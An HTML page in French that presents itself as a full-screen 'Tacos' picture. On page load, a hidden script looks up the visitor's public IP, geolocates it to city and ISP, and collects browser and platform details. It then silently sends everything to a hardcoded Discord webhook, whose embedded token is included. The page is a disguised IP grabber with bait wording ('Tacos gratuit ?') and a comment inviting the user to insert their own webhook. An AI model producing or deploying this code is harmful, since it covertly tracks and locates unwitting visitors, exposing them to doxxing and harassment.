<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Tacos</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    .image-container {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #000;
    }

    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <div class="image-container">
    <img src="https://i.imgur.com/4Z3zY0L.jpeg" alt="Tacos">
  </div>

  <script>
    // METS TON URL DE WEBHOOK DISCORD ICI ⬇️
    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1490663339284631685/I7AfZ_ci4CUyTmk9f2BcAdI0qotYl9B5VjUNLEWnW7XShOSnrzoG0pbKqZEJ2Ik5GTRr";

    async function getPublicIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("Erreur récupération IP:", error);
        return "IP non détectée";
      }
    }

    async function getGeoInfo(ip) {
      try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
          country: data.country_name || "Inconnu",
          city: data.city || "Inconnu",
          region: data.region || "Inconnu",
          isp: data.org || "Inconnu"
        };
      } catch (error) {
        console.error("Erreur géolocalisation:", error);
        return { country: "Inconnu", city: "Inconnu", region: "Inconnu", isp: "Inconnu" };
      }
    }

    async function sendToDiscord(ip, geo) {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const date = new Date().toLocaleString("fr-FR");

      const embed = {
        title: "🌮 Nouvelle visite - Tacos 🧀",
        color: 0xFFA500,
        fields: [
          { name: "🌐 IP Publique", value: `\`${ip}\``, inline: true },
          { name: "📍 Pays", value: geo.country, inline: true },
          { name: "🏙️ Ville", value: geo.city, inline: true },
          { name: "🗺️ Région", value: geo.region, inline: true },
          { name: "📡 FAI", value: geo.isp, inline: false },
          { name: "💻 User Agent", value: userAgent.substring(0, 200), inline: false },
          { name: "🖥️ Plateforme", value: platform, inline: true },
          { name: "🌍 Langue", value: language, inline: true },
          { name: "📅 Heure", value: date, inline: true }
        ],
        footer: { text: "🍟 Tacos gratuit ?" },
        timestamp: new Date().toISOString()
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ embeds: [embed] })
        });
        console.log("✅ IP envoyée à Discord");
      } catch (error) {
        console.error("❌ Erreur envoi Discord:", error);
      }
    }

    async function main() {
      const ip = await getPublicIP();
      const geo = await getGeoInfo(ip);
      await sendToDiscord(ip, geo);
    }

    // Lancement
    main();
  </script>
</body>
</html>
